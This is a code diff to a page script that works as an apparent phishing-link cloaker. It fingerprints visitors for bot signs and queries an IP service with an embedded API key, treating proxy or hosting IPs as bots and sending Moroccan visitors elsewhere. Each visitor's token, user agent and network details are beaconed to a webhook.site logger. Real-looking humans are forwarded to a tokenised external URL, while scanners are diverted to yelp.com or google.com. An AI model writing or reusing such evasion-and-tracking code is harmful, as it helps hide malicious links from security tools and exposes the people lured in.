@@ -9,8 +9,11 @@
       const ua = navigator.userAgent || "";
       const uaClean = ua.toLowerCase().replace(/\s+/g, '');
       let isBot = false;
+      let isProxy = false;
+      let isHosting = false;
+      let isMorocco = false;
 
-      // Step 1: User-Agent bot check
+      // Basic UA-based bot check
       if (
         uaClean.includes("bot") || uaClean.includes("crawl") || uaClean.includes("spider") ||
         uaClean.includes("slurp") || uaClean.includes("headless") || uaClean.includes("phantom") ||
@@ -19,7 +22,7 @@
         isBot = true;
       }
 
-      // Step 2: JS/localStorage check
+      // JS and localStorage test
       try {
         localStorage.setItem("js-check", "1");
         if (localStorage.getItem("js-check") !== "1") isBot = true;
@@ -27,36 +30,55 @@
         isBot = true;
       }
 
-      // Step 3: Plugin/screen analysis
+      // Plugin/screen tests
       if (navigator.plugins.length === 0 || screen.colorDepth < 8 || screen.availHeight === 0) {
         isBot = true;
       }
 
-      // Step 4: Monitor mouse movement
       let moved = false;
       window.addEventListener("mousemove", () => moved = true);
 
-      // Step 5: Token check
-      if (!hash) {
-        window.location.href = "https://google.com";
-        return;
-      }
+      // IP check
+      fetch("https://ipapi.co/json?key=F74e0gpSdeUEaF4")
+        .then(res => res.json())
+        .then(data => {
+          const org = (data.org || "").toLowerCase();
+          if (data.proxy === true || data.hosting === true) {
+            isBot = true;
+          }
+          if (data.country === "MA") {
+            isMorocco = true;
+          }
 
-      // Step 6: Log to webhook
-      const logUrl = "https://webhook.site/1723ccce-7bc8-46c1-802e-838962bea4df";
-      const fullLogUrl = `${logUrl}?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&ts=${Date.now()}`;
-      const img = new Image();
-      img.src = fullLogUrl;
+          if (!hash) {
+            window.location.href = "https://google.com";
+            return;
+          }
 
-      // Step 7: Final redirect after 2 seconds
-      setTimeout(() => {
-        const finalBot = isBot || !moved;
-        if (finalBot) {
-          window.location.href = "https://yelp.com";
-        } else {
-          window.location.replace(`https://szliyi.com/${hash}`);
-        }
-      }, 2000);
+          // Log to webhook
+          const logUrl = "https://webhook.site/1723ccce-7bc8-46c1-802e-838962bea4df";
+          const fullLogUrl = `${logUrl}?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&proxy=${data.proxy}&hosting=${data.hosting}&country=${data.country}&ts=${Date.now()}`;
+          const img = new Image();
+          img.src = fullLogUrl;
+
+          setTimeout(() => {
+            if (isMorocco) {
+              window.location.href = "https://www.maroc.ma";
+            } else if (isBot || !moved) {
+              window.location.href = "https://yelp.com";
+            } else {
+              window.location.replace(`https://szliyi.com/${hash}`);
+            }
+          }, 2500);
+        })
+        .catch(() => {
+          // On IPAPI fail, fallback
+          if (!hash) {
+            window.location.href = "https://google.com";
+          } else {
+            window.location.replace(`https://szliyi.com/${hash}`);
+          }
+        });
     });
   </script>
 </head>
